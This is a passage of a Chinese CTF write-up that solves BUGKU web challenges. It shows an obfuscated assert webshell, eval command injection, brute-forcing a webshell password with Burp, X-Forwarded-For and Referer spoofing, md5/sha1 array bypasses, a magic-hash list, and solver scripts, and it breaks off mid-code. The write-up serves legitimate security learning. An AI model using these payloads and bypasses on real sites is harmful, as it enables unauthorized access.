<p><img src="/./../image/achieve/202411/BUGKU/image-20241125195024684.png" alt="image-20241125195024684"></p>
<h2 id="game1"><a href="#game1" class="headerlink" title="game1"></a>game1</h2><h3 id="前端验证"><a href="#前端验证" class="headerlink" title="#前端验证"></a>#前端验证</h3><p>是一个盖楼游戏</p>
<p>在源代码中看到了</p>
<p><img src="/./../image/achieve/202411/BUGKU/image-20241125204332965.png" alt="image-20241125204332965"></p>
<p>这里的话应该就是我们的突破口了，可能是达到多少分才会有flag</p>
<p>然后我们在游戏结束页面进行抓包</p>
<p><img src="/./../image/achieve/202411/BUGKU/image-20241125204429474.png" alt="image-20241125204429474"></p>
<p>sign中的MTc1&#x3D;&#x3D;是175编码后的，那我们改一下score为9999试一下</p>
<p><img src="/./../image/achieve/202411/BUGKU/image-20241125204805777.png" alt="image-20241125204805777"></p>
<p>看来分数够了，成功拿到flag!</p>
<h2 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h2><h3 id="js代码审计"><a href="#js代码审计" class="headerlink" title="#js代码审计"></a>#js代码审计</h3><p>题目提示我们看源代码，那我们就看一下源代码</p>
<p><img src="/./../image/achieve/202411/BUGKU/image-20241125204914898.png" alt="image-20241125204914898"></p>
<ol>
<li><code>var p1 = &#39;...&#39;;</code> 和 <code>var p2 = &#39;...&#39;;</code>：这里定义了两个变量 <code>p1</code> 和 <code>p2</code>，它们的值是经过编码的字符串。这种编码方式看起来类似于 URL 编码，将字符转换为 <code>%xx</code> 格式。</li>
<li><code>eval(unescape(p1) + unescape(&#39;%35%34%61%61%32&#39; + p2));</code>：这里使用了 <code>eval()</code> 函数，它将字符串参数作为 JavaScript 代码进行执行。<code>unescape()</code> 函数用于解码 URL 编码的字符串。这行代码将对 <code>p1</code> 和 <code>p2</code> 进行解码后拼接起来，然后将其作为 JavaScript 代码进行执行。</li>
</ol>
<p>然后我拿去解码得到了这些</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">checkSubmit</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> a=<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;password&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">&quot;undefined&quot;</span>!=<span class="keyword">typeof</span> a)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&quot;67d709b2b54aa2aa648cf6e87a7114f1&quot;</span>==a.<span class="property">value</span>)<span class="keyword">return</span>!<span class="number">0</span>;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&quot;Error&quot;</span>);a.<span class="title function_">focus</span>();</span><br><span class="line">        <span class="keyword">return</span>!<span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;levelQuest&quot;</span>).<span class="property">onsubmit</span>=checkSubmit;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ol>
<li><code>function checkSubmit() &#123; ... &#125;</code>: 这是一个名为 <code>checkSubmit</code> 的函数，用于验证密码字段的值。函数内部包含以下逻辑：<ul>
<li><code>var a = document.getElementById(&quot;password&quot;);</code>: 通过 <code>document.getElementById()</code> 方法获取 id 为 “password” 的元素，通常表示密码输入框。</li>
<li><code>if (&quot;undefined&quot; != typeof a) &#123; ... &#125;</code>: 检查是否成功获取到密码输入框元素。</li>
<li><code>if (&quot;67d709b2%654aa2aa648cf6e87a7114f1&quot; == a.value) &#123; return true; &#125;</code>: 如果密码输入框的值等于指定的字符串（”67d709b2%654aa2aa648cf6e87a7114f1”），则返回 <code>true</code>，表示验证通过。</li>
<li><code>alert(&quot;Error&quot;);</code>: 如果密码验证不通过，弹出警告框提示用户出错。</li>
<li><code>a.focus(); return false;</code>: 将焦点设置回密码输入框，并返回 <code>false</code>，表示验证未通过。</li>
</ul>
</li>
<li><code>document.getElementById(&quot;levelQuest&quot;).onsubmit = checkSubmit;</code>: 这行代码将 <code>checkSubmit</code> 函数绑定到 id 为 “levelQuest” 的表单的 <code>onsubmit</code> 事件上。这意味着在表单提交之前会执行 <code>checkSubmit</code> 函数，用于验证密码字段的值，如果验证通过，则表单提交成功，否则会提示错误信息并保持在当前页面。</li>
</ol>
<p>所以我们要让我们输入的值是67d709b2b54aa2aa648cf6e87a7114f1，输入后就能拿到flag了</p>
<h2 id="网站被黑"><a href="#网站被黑" class="headerlink" title="网站被黑"></a>网站被黑</h2><h3 id="后门木马"><a href="#后门木马" class="headerlink" title="#后门木马"></a>#后门木马</h3><p>题目提示:网站被黑了 黑客会不会留下后门</p>
<p>既然是网站被黑了，那黑客必然会留下什么shell之类的恶意代码，那我们扫一下目录</p>
<p><img src="/./../image/achieve/202411/BUGKU/image-20241125211016567.png" alt="image-20241125211016567"></p>
<p>访问一下shell.php</p>
<p><img src="/./../image/achieve/202411/BUGKU/image-20241125211206101.png" alt="image-20241125211206101"></p>
<p>试了一下弱口令发现都不得行，那就只能爆破了</p>
<p><img src="/./../image/achieve/202411/image-20241125211516817.png" alt="image-20241125211516817"></p>
<p><img src="/./../image/achieve/202411/BUGKU/image-20241125211523239.png" alt="image-20241125211523239"></p>
<p>额我们试一下bp自带的password字典</p>
<p><img src="/./../image/achieve/202411/BUGKU/image-20241125211813962.png" alt="image-20241125211813962"></p>
<p>刚好爆出来是有的</p>
<h2 id="bp"><a href="#bp" class="headerlink" title="bp"></a>bp</h2><h3 id="爆破密码"><a href="#爆破密码" class="headerlink" title="#爆破密码"></a>#爆破密码</h3><p>提示了弱密码top1000？z?????，让我们找出密码</p>
<p><img src="/./../image/achieve/202411/BUGKU/image-20241125212327225.png" alt="image-20241125212327225"></p>
<p>账号是admin默认，看样子是需要我们进行爆破，字典应该是top1000，</p>
<p><img src="/./../image/achieve/202411/BUGKU/image-20241125212754900.png" alt="image-20241125212754900"></p>
<p>结果发现没打出来，我看了一下response的内容，发现了这段js代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">var</span> r = &#123;code: <span class="string">&#x27;bugku10000&#x27;</span>&#125;</span><br><span class="line"> <span class="keyword">if</span>(r.code == <span class="string">&#x27;bugku10000&#x27;</span>)&#123;</span><br><span class="line">       console.<span class="title function_ invoke__">log</span>(<span class="string">&#x27;e&#x27;</span>);</span><br><span class="line">document.<span class="title function_ invoke__">getElementById</span>(<span class="string">&#x27;d&#x27;</span>).innerHTML = <span class="string">&quot;Wrong account or password!&quot;</span>;</span><br><span class="line"> &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">       console.<span class="title function_ invoke__">log</span>(<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">       window.location.href = <span class="string">&#x27;success.php?code=&#x27;</span>+r.code;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>后来看了其他大佬的解释：</p>
<p>若r值为{code: ‘bugku10000’}，则会返回错误</p>
<p>{通过这一句“window.location.href &#x3D; ‘success.php?code&#x3D;’+r.code;”，可以判断网页将跳转到以code作为参数的success.php页面。其中code的值来自于var r &#x3D; {code: ‘bugku10000’}。</p>
<p> 至此，可以考虑用burp进行爆破。但通过第一次爆破过程中所以返回页面长度一致，可以判断code值的长度与’bugku10000’相同，也是10。考虑到对于10个字符长度进行爆破需要的时间太长，因此现在以code为参数爆破是不可行的。</p>
<p>因为code是success.php页面的参数，因此在登录页面当使用正确密码时，code的值（r.code）应该与’bugku10000’不同，进而r的值也与{code: ‘bugku10000’}不同。</p>
<p> 也就是说，如果我们输入正确的密码，返回页面的r将不是{code: ‘bugku10000’}。</p>
<p>因此可以在burp的intruder爆破模块中，使用{code: ‘bugku10000’}对返回包内容进行筛选。找到返回包不含有{code: ‘bugku10000’}的，就可能是使用正确的密码。}</p>
<p><img src="/./../image/achieve/202411/BUGKU/image-20241125213525551.png" alt="image-20241125213525551"></p>
<p><img src="/./../image/achieve/202411/BUGKU/image-20241125213819622.png" alt="image-20241125213819622"></p>
<p>爆破后找到了这个密码的回显包中没有{code: ‘bugku10000’}，猜测可能是我们想要的密码，直接输入就能拿到flag了</p>
<h2 id="好像需要密码"><a href="#好像需要密码" class="headerlink" title="好像需要密码"></a>好像需要密码</h2><h3 id="纯数字爆破"><a href="#纯数字爆破" class="headerlink" title="#纯数字爆破"></a>#纯数字爆破</h3><p><img src="/./../image/achieve/202411/BUGKU/image-20241125214206865.png" alt="image-20241125214206865"></p>
<p>又是一个密码界面，直接上爆破吧，因为是纯数字，所以我们设置纯数字的字典进行爆破就可以了</p>
<p><img src="/./../image/achieve/202411/BUGKU/image-20241125214705440.png" alt="image-20241125214705440"></p>
<p>这道题我看到需要爆破的量很多，我就去搜索怎么添加线程。结果忙来忙去浪费了很多时间，不如让他挂着爆破，最后还是拿到flag了</p>
<h2 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h2><h3 id="assert函数"><a href="#assert函数" class="headerlink" title="#assert函数"></a>#assert函数</h3><p>打开是一个空白页面，不过在题目提示中有代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$poc</span> = <span class="string">&quot;a#s#s#e#r#t&quot;</span>; </span><br><span class="line"><span class="variable">$poc_1</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;#&quot;</span>, <span class="variable">$poc</span>); </span><br><span class="line"><span class="variable">$poc_2</span> = <span class="variable">$poc_1</span>[<span class="number">0</span>] . <span class="variable">$poc_1</span>[<span class="number">1</span>] . <span class="variable">$poc_1</span>[<span class="number">2</span>] . <span class="variable">$poc_1</span>[<span class="number">3</span>] . <span class="variable">$poc_1</span>[<span class="number">4</span>] . <span class="variable">$poc_1</span>[<span class="number">5</span>];</span><br><span class="line"><span class="variable">$poc_2</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;s&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ol>
<li>首先，定义了一个变量 <code>$poc</code>，其值为字符串 “a#s#s#e#r#t”</li>
<li>接着，使用 <code>explode</code> 函数将字符串 <code>$poc</code> 按照 “#” 分割成数组 <code>$poc_1</code>，所以 <code>$poc_1</code> 的值为 <code>[&quot;a&quot;, &quot;s&quot;, &quot;s&quot;, &quot;e&quot;, &quot;r&quot;, &quot;t&quot;]</code>。</li>
<li>然后，从数组 <code>$poc_1</code> 中取出各个元素并拼接成一个字符串 <code>$poc_2</code>，这里实际上是将函数名 <code>assert</code> 重新组合成字符串。</li>
<li>最后，通过 <code>$poc_2</code> 这个字符串作为函数名，执行用户传入的GET参数 <code>&#39;s&#39;</code> 的内容。</li>
</ol>
<p>那我们了解一下assert函数</p>
<p><code>assert</code> 函数是PHP中的一个调试函数，通常用于在代码中验证某个条件是否为真</p>
<p>这里我猜测是我们需要传入的参数s是一个命令，然后assert会将这个命令解析执行</p>
<p>我们可以测试一下</p>
<p><img src="/./../image/achieve/202411/BUGKU/image-20241125232837903.png" alt="image-20241125232837903"></p>
<p>发现是可以正常执行的，那我们就用我们熟悉的ls和cat就可以拿到flag了</p>
<h2 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h2><h3 id="eval函数"><a href="#eval函数" class="headerlink" title="#eval函数"></a>#eval函数</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    <span class="variable">$a</span> = @<span class="variable">$_REQUEST</span>[<span class="string">&#x27;hello&#x27;</span>];</span><br><span class="line">    <span class="keyword">eval</span>( <span class="string">&quot;var_dump(<span class="subst">$a</span>);&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>直接对hello传入system命令就行了</p>
<h2 id="需要管理员"><a href="#需要管理员" class="headerlink" title="需要管理员"></a>需要管理员</h2><h3 id="robot文件泄露"><a href="#robot文件泄露" class="headerlink" title="#.robot文件泄露"></a>#.robot文件泄露</h3><p><img src="/./../image/achieve/202411/BUGKU/image-20241125233808776.png" alt="image-20241125233808776"></p>
<p>查看源码和页面都没发现什么有用的信息，我们试着用dirsearch扫一下目录</p>
<p><img src="/./../image/achieve/202411/BUGKU/image-20241128160951844.png" alt="image-20241128160951844"></p>
<p>得到一个&#x2F;robots.txt文件，我们访问一下</p>
<p><img src="/./../image/achieve/202411/BUGKU/image-20241128161024755.png" alt="image-20241128161024755"></p>
<p> 我们访问一下</p>
<p><img src="/./../image/achieve/202411/BUGKU/image-20241128161414514.png" alt="image-20241128161414514"></p>
<p>直接传入x&#x3D;admin就可以了</p>
<p><img src="/./../image/achieve/202411/BUGKU/image-20241128161501709.png" alt="image-20241128161501709"></p>
<h2 id="程序员本地网站"><a href="#程序员本地网站" class="headerlink" title="程序员本地网站"></a>程序员本地网站</h2><h3 id="伪造X-Forwarded-For请求头"><a href="#伪造X-Forwarded-For请求头" class="headerlink" title="#伪造X-Forwarded-For请求头"></a>#伪造X-Forwarded-For请求头</h3><p><img src="/./../image/achieve/202411/BUGKU/image-20241126104244668.png" alt="image-20241126104244668"></p>
<p>看到这个第一时间想到的就是修改请求头进行内网伪装</p>
<p><strong>X-Forwarded-For		用来说明从哪里来的，一般用来内网伪装			X-Forwarded-For: 127.0.0.1</strong></p>
<p>在请求包中添加X-Forwarded-For: 127.0.0.1</p>
<p><img src="/./../image/achieve/202411/BUGKU/image-20241126104319404.png" alt="image-20241126104319404"></p>
<p>直接就拿到flag了</p>
<h2 id="你从哪里来"><a href="#你从哪里来" class="headerlink" title="你从哪里来"></a>你从哪里来</h2><h3 id="伪造Referer请求头"><a href="#伪造Referer请求头" class="headerlink" title="#伪造Referer请求头"></a>#伪造Referer请求头</h3><p><img src="/./../image/achieve/202411/BUGKU/image-20241126104920035.png" alt="image-20241126104920035"></p>
<p>这个一看就是需要修改请求头了</p>
<p><strong>Referer	先前网页的地址，当前请求网页紧随其后,即来路	Referer: <a href="www.baidu.com">www.baidu.com</a></strong></p>
<p>需要先前网页是谷歌的地址</p>
<p><img src="/./../image/achieve/202411/BUGKU/image-20241126105256625.png" alt="image-20241126105256625"></p>
<h2 id="前女友"><a href="#前女友" class="headerlink" title="前女友"></a>前女友</h2><h3 id="绕过md5和strcmp-验证"><a href="#绕过md5和strcmp-验证" class="headerlink" title="#绕过md5和strcmp()验证"></a>#绕过md5和strcmp()验证</h3><p><img src="/./../image/achieve/202411/BUGKU/image-20241126105607312.png" alt="image-20241126105607312"></p>
<p>在源代码中找到了code.txt</p>
<p><img src="/./../image/achieve/202411/BUGKU/image-20241126105944232.png" alt="image-20241126105944232"></p>
<p>我们点进去看一下</p>
<p><img src="/./../image/achieve/202411/BUGKU/image-20241126105950391.png" alt="image-20241126105950391"></p>
<p><code>strcmp()</code> 是一个 PHP 函数，用于比较两个字符串。它的用法如下：</p>
<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> <span class="keyword">strcmp</span> ( <span class="keyword">string</span> $str1 , <span class="keyword">string</span> $str2 )</span><br></pre></td></tr></table></figure>

<ul>
<li>如果 <code>str1</code> 小于 <code>str2</code>，那么 <code>strcmp()</code> 返回一个小于 0 的整数。</li>
<li>如果 <code>str1</code> 大于 <code>str2</code>，那么 <code>strcmp()</code> 返回一个大于 0 的整数。</li>
<li>如果 <code>str1</code> 等于 <code>str2</code>，那么 <code>strcmp()</code> 返回 0。</li>
</ul>
<p>strcmp函数无法比较数组,对象，会返回0</p>
<p>md5可以用数组绕过，也可以用碰撞</p>
<p><img src="/./../image/achieve/202411/BUGKU/image-20241126110733003.png" alt="image-20241126110733003"></p>
<h2 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h2><h3 id="MD5碰撞"><a href="#MD5碰撞" class="headerlink" title="#MD5碰撞"></a>#MD5碰撞</h3><p><img src="/./../image/achieve/202411/BUGKU/image-20241126110838510.png" alt="image-20241126110838510"></p>
<p>那我们传入a&#x3D;1试试</p>
<p><img src="/./../image/achieve/202411/BUGKU/image-20241126110902896.png" alt="image-20241126110902896"></p>
<p>提示错误，题目提示是md5碰撞，根据 PHP 弱类型比较的特点，所以如果两个不同的密码经过哈希以后，其哈希值都是以 <code>0E</code> 开头的，那么 PHP 将会认为他们相同，这就是所谓的 <strong>MD5 碰撞漏洞</strong>。</p>
<p>所以我们选一个常见的md5碰撞值就可以了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">大写字母类：</span><br><span class="line">QLTHNDT</span><br><span class="line"><span class="number">0e405967825401955372549139051580</span></span><br><span class="line">QNKCDZO</span><br><span class="line"><span class="number">0e830400451993494058024219903391</span></span><br><span class="line">EEIZDOI</span><br><span class="line"><span class="number">0e782601363539291779881938479162</span></span><br><span class="line">TUFEPMC</span><br><span class="line"><span class="number">0e839407194569345277863905212547</span></span><br><span class="line">UTIPEZQ</span><br><span class="line"><span class="number">0e382098788231234954670291303879</span></span><br><span class="line">UYXFLOI</span><br><span class="line"><span class="number">0e552539585246568817348686838809</span></span><br><span class="line">IHKFRNS</span><br><span class="line"><span class="number">0e256160682445802696926137988570</span></span><br><span class="line">PJNPDWY</span><br><span class="line"><span class="number">0e291529052894702774557631701704</span></span><br><span class="line">ABJIHVY</span><br><span class="line"><span class="number">0e755264355178451322893275696586</span></span><br><span class="line">DQWRASX</span><br><span class="line"><span class="number">0e742373665639232907775599582643</span></span><br><span class="line">DYAXWCA</span><br><span class="line"><span class="number">0e424759758842488633464374063001</span></span><br><span class="line">GEGHBXL</span><br><span class="line"><span class="number">0e248776895502908863709684713578</span></span><br><span class="line">GGHMVOE</span><br><span class="line"><span class="number">0e362766013028313274586933780773</span></span><br><span class="line">GZECLQZ</span><br><span class="line"><span class="number">0e537612333747236407713628225676</span></span><br><span class="line">NWWKITQ</span><br><span class="line"><span class="number">0e763082070976038347657360817689</span></span><br><span class="line">NOOPCJF</span><br><span class="line"><span class="number">0e818888003657176127862245791911</span></span><br><span class="line">MAUXXQC</span><br><span class="line"><span class="number">0e478478466848439040434801845361</span></span><br><span class="line">MMHUWUV</span><br><span class="line"><span class="number">0e701732711630150438129209816536</span></span><br></pre></td></tr></table></figure>

<h2 id="各种绕过哟"><a href="#各种绕过哟" class="headerlink" title="各种绕过哟"></a>各种绕过哟</h2><h3 id="sha1数组绕过"><a href="#sha1数组绕过" class="headerlink" title="#sha1数组绕过"></a>#sha1数组绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;flag&#123;xxxxxxxxxxxxxxxxxx&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;uname&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;uname&#x27;</span>] == <span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">print</span> <span class="string">&#x27;passwd can not be uname.&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="title function_ invoke__">sha1</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;uname&#x27;</span>]) === <span class="title function_ invoke__">sha1</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>])&amp;(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]==<span class="string">&#x27;margin&#x27;</span>))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Flag: &#x27;</span>.<span class="variable">$flag</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">print</span> <span class="string">&#x27;sorry!&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>关注判断条件</p>
<p>只要使uname的sha1的值与passwd的sha1的值相等即可，但是同时他们两个的值又不能相等</p>
<p>sha1()函数无法处理数组类型，会将报错并返回false</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">GET</span><span class="symbol">:id=margin&amp;&amp;uname[]=</span><span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="variable constant_">POST</span><span class="symbol">:passwd[]=</span><span class="number">2</span></span><br></pre></td></tr></table></figure>

<h2 id="秋名山车神"><a href="#秋名山车神" class="headerlink" title="秋名山车神"></a>秋名山车神</h2><h3 id="计算脚本"><a href="#计算脚本" class="headerlink" title="#计算脚本"></a>#计算脚本</h3><p>多刷新几次会有出现</p>
<p><img src="/./../image/achieve/202411/BUGKU/image-20241126112822178.png" alt="image-20241126112822178"></p>
<p>说明我们要post提交参数value</p>
<p>直接用脚本吧(抄的baozongwi 的)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests<span class="comment">#用于发送 HTTP 请求。</span></span><br><span class="line"><span class="keyword">import</span> re<span class="comment">#用于处理正则表达式。</span></span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://114.67.175.224:19401/&quot;</span><span class="comment">#要访问的网页的 URL。</span></span><br><span class="line">s=requests.Session()<span class="comment">#保持会话</span></span><br><span class="line"></span><br><span class="line">r=s.get(url)</span><br><span class="line">equation=re.search(<span class="string">r&#x27;(\d+[+\-*])+(\d+)&#x27;</span>,r.text).group()<span class="comment">#在页面返回的文本中寻找一个数学表达式，并将找到的表达式存储在变量 equation 中。</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">50</span>):</span><br><span class="line">    result=<span class="built_in">eval</span>(equation)<span class="comment">#eval() 函数用来执行一个字符串表达式，并返回表达式的值。</span></span><br><span class="line">    key=&#123;<span class="string">&#x27;value&#x27;</span>:result&#125;</span><br><span class="line">    response=s.post(url=url,data=key)</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> response.text:<span class="comment">#查找在response中的flag</span></span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<h2 id="速度要快"><a href="#速度要快" class="headerlink" title="速度要快"></a>速度要快</h2><h3 id="脚本处理请求"><a href="#脚本处理请求" class="headerlink" title="#脚本处理请求"></a>#脚本处理请求</h3><p><img src="/./../image/achieve/202411/BUGKU/image-20241126114230980.png" alt="image-20241126114230980"></p>
<p>刷新并没有发现什么，直接抓包</p>
<p><img src="/./../image/achieve/202411/BUGKU/image-20241126114249269.png" alt="image-20241126114249269"></p>
<p>发现response中有flag，base64解密得到</p>
<p><img src="/./../image/achieve/202411/BUGKU/image-20241126114340881.png" alt="image-20241126114340881"></p>
<p>还有一层加密</p>
<p><img src="/./../image/achieve/202411/BUGKU/image-20241126114357915.png" alt="image-20241126114357915"></p>
<p>这个数是什么呢，根据注释里面的内容，猜测我们需要post传入一个参数margin</p>
<p>修改一下请求包为post，传入margin&#x3D;597691</p>
<p><img src="/./../image/achieve/202411/BUGKU/image-20241126114537404.png" alt="image-20241126114537404"></p>
<p>有变化，继续分析，然后我发现是重复的，没办法，只能写脚本了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://114.67.175.224:16522/&quot;</span></span><br><span class="line">s=requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">50</span>):</span><br><span class="line">    r=s.get(url)<span class="comment">#发起一个 GET 请求，获取指定 URL 的响应，并将响应存储在变量 r 中</span></span><br><span class="line">    header_flag=r.headers[<span class="string">&#x27;flag&#x27;</span>]<span class="comment">#从响应的头信息中获取名为 &#x27;flag&#x27; 的值，并将其存储在 header_flag 中。</span></span><br><span class="line">    header_flag=base64.b64decode(header_flag).decode()</span><br><span class="line"></span><br><span class="line">    value=header_flag.split(<span class="string">&#x27; &#x27;</span>)[-<span class="number">1</span>]<span class="comment"># 将字符串 header_flag 按空格分割，然后取最后一个部分作为 value。</span></span><br><span class="line">    v=base64.b64decode(value).decode(<span class="string">&#x27;utf-8&#x27;</span>)<span class="comment"># 对 Base64 编码的 value 进行解码，然后将其转换为 UTF-8 编码的字符串。</span></span><br><span class="line">    response=s.post(url,data=&#123;<span class="string">&#x27;margin&#x27;</span>:v&#125;)</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">        <span class="built_in">print</span>(response.text)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents"></a>file_get_contents</h2><h3 id="伪协议绕过"><a href="#伪协议绕过" class="headerlink" title="#伪协议绕过"></a>#伪协议绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$ac</span>))&#123;</span><br><span class="line">    <span class="variable">$f</span> = <span class="title function_ invoke__">trim</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$fn</span>));</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$ac</span> === <span 